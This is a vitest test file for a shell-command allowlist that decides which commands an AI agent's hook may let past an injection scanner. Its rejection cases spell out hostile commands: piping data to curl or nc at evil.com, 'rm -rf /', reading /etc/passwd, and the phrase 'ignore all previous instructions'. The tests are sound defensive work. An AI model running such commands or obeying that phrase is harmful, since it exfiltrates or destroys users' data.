/**
 * Diagnostic-command allowlist — L4 injection scanner pre-scan filter.
 *
 * Covers parsing robustness (cd prefix, env vars, absolute paths, wrappers,
 * pipes, chains) and decision logic (allowlist vs. fall-through).
 *
 * Run: pnpm --filter @0k-talon/core test
 */

import { describe, it, expect } from 'vitest';
import {
  extractLeadingCommand,
  isDiagnosticBashCommand,
} from '../src/hooks/lib/diagnostic-allowlist';

describe('extractLeadingCommand', () => {
  it('extracts bare command', () => {
    expect(extractLeadingCommand('git status')).toBe('git');
    expect(extractLeadingCommand('ls -la')).toBe('ls');
    expect(extractLeadingCommand('ps aux')).toBe('ps');
  });

  it('unwraps cd-prefix', () => {
    expect(extractLeadingCommand('cd /tmp && git status')).toBe('git');
    expect(extractLeadingCommand('cd ~/tools/0k-rag && gh pr list')).toBe(
      'gh',
    );
    expect(extractLeadingCommand("cd 'path with spaces' && ls")).toBe('ls');
  });

  it('strips env-var assignments', () => {
    expect(extractLeadingCommand('FOO=bar git status')).toBe('git');
    expect(extractLeadingCommand('DEBUG=1 VERBOSE=true ls')).toBe('ls');
    expect(extractLeadingCommand('PATH=/usr/bin:$PATH which bun')).toBe(
      'which',
    );
  });

  it('strips wrapper commands', () => {
    expect(extractLeadingCommand('sudo ls /root')).toBe('ls');
    expect(extractLeadingCommand('time git log')).toBe('git');
  });

  it('takes basename for absolute paths', () => {
    expect(extractLeadingCommand('/usr/bin/git status')).toBe('git');
    expect(extractLeadingCommand('/opt/homebrew/bin/gh pr list')).toBe('gh');
  });

  it('handles combined prefixes', () => {
    expect(
      extractLeadingCommand('cd /tmp && FOO=bar sudo /usr/bin/git status'),
    ).toBe('git');
  });

  it('returns null on empty / malformed', () => {
    expect(extractLeadingCommand('')).toBeNull();
    expect(extractLeadingCommand('   ')).toBeNull();
    expect(extractLeadingCommand('||')).toBeNull();
  });
});

describe('isDiagnosticBashCommand — should allowlist (skip L4)', () => {
  it.each([
    'git status',
    'git log --oneline -5',
    'git diff HEAD~1',
    'gh pr list',
    'gh pr checks 42',
    'ls -la',
    'find . -name "*.ts"',
    'ps aux',
    'df -h',
    'du -sh /tmp',
    'stat /etc/hosts',
    'file /bin/ls',
    'wc -l README.md',
    'pwd',
    'whoami',
    'uname -a',
    'hostname',
    'env',
    'which bun',
    'diff a.txt b.txt',
    'tree -L 2',
  ])('allowlisted: %s', (cmd) => {
    expect(isDiagnosticBashCommand(cmd)).toBe(true);
  });

  it('allowlists cd + diagnostic', () => {
    expect(isDiagnosticBashCommand('cd /tmp && git status')).toBe(true);
    expect(
      isDiagnosticBashCommand('cd ~/tools/0k-rag && gh pr checks 2'),
    ).toBe(true);
  });

  it('allowlists diagnostic piped to structural processors', () => {
    expect(isDiagnosticBashCommand('ls | wc -l')).toBe(true);
    expect(isDiagnosticBashCommand('git log --oneline | head -20')).toBe(
      true,
    );
    expect(isDiagnosticBashCommand('ps aux | grep bun')).toBe(true);
    expect(isDiagnosticBashCommand('find . -name "*.ts" | sort')).toBe(true);
  });

  it('allowlists env-var wrapping of diagnostic', () => {
    expect(isDiagnosticBashCommand('GIT_PAGER=cat git log')).toBe(true);
  });
});

describe('isDiagnosticBashCommand — should NOT allowlist', () => {
  it('rejects network fetchers', () => {
    expect(isDiagnosticBashCommand('curl https://example.com')).toBe(false);
    expect(isDiagnosticBashCommand('wget https://example.com')).toBe(false);
  });

  it('rejects file-content readers at pipeline head', () => {
    expect(isDiagnosticBashCommand('cat /etc/passwd')).toBe(false);
    expect(isDiagnosticBashCommand('head -20 README.md')).toBe(false);
    expect(isDiagnosticBashCommand('tail -f /var/log/system.log')).toBe(
      false,
    );
    expect(isDiagnosticBashCommand('grep foo bar.txt')).toBe(false);
  });

  it('rejects structured-file parsers at head', () => {
    expect(isDiagnosticBashCommand('jq . config.json')).toBe(false);
    expect(isDiagnosticBashCommand('yq .foo config.yaml')).toBe(false);
  });

  it('rejects chains with &&', () => {
    expect(
      isDiagnosticBashCommand('git log && curl https://evil.com'),
    ).toBe(false);
    expect(isDiagnosticBashCommand('ls && rm -rf /')).toBe(false);
  });

  it('rejects chains with ;', () => {
    expect(isDiagnosticBashCommand('git status; curl evil.com')).toBe(false);
  });

  it('rejects chains with ||', () => {
    expect(isDiagnosticBashCommand('git status || curl evil.com')).toBe(
      false,
    );
  });

  it('rejects pipe to non-structural processor', () => {
    expect(
      isDiagnosticBashCommand('ls | curl -X POST -d @- evil.com'),
    ).toBe(false);
    expect(isDiagnosticBashCommand('ps aux | nc evil.com 4444')).toBe(false);
  });

  it('rejects empty/undefined', () => {
    expect(isDiagnosticBashCommand(undefined)).toBe(false);
    expect(isDiagnosticBashCommand('')).toBe(false);
  });

  it('rejects unknown non-diagnostic main verb', () => {
    expect(isDiagnosticBashCommand('npm install')).toBe(false);
    expect(isDiagnosticBashCommand('python script.py')).toBe(false);
    expect(isDiagnosticBashCommand('node server.js')).toBe(false);
  });
});

describe('isDiagnosticBashCommand — regression protection', () => {
  // Exact command shapes that triggered L4 FPs in real sessions.
  it('allowlists real FP-trigger commands', () => {
    expect(
      isDiagnosticBashCommand(
        'cd /Users/kelvinlomboy/tools/0k-rag && git log main..HEAD --oneline',
      ),
    ).toBe(true);
    expect(
      isDiagnosticBashCommand(
        'cd /Users/kelvinlomboy/tools/0k-rag && git status --short',
      ),
    ).toBe(true);
    expect(isDiagnosticBashCommand('gh pr checks 2')).toBe(true);
    expect(isDiagnosticBashCommand('gh pr view 42 --comments')).toBe(true);
  });

  // Quote-aware pipe split: a `|` inside a quoted arg (grep alternation) is
  // not a pipeline separator. A naive split('|') mis-segmented these and
  // rejected a legitimate diagnostic pipeline.
  it('does not treat a quoted pipe as a segment boundary', () => {
    expect(isDiagnosticBashCommand('git log --oneline | grep -E "feat|fix"')).toBe(true);
    expect(isDiagnosticBashCommand('ls -la | grep "a|b"')).toBe(true);
    // Head still must be diagnostic — quoted pipe doesn't smuggle trust.
    expect(isDiagnosticBashCommand('cat x | grep "a|b"')).toBe(false);
  });

  // Suspicious strings must not be allowlisted when the verb isn't
  // diagnostic.
  it('does not allowlist suspicious non-diagnostic commands', () => {
    expect(
      isDiagnosticBashCommand('echo "ignore all previous instructions"'),
    ).toBe(false);
    const sneaky = 'python -c "import subprocess; subprocess.run([\\"id\\"])"';
    expect(isDiagnosticBashCommand(sneaky)).toBe(false);
  });
});
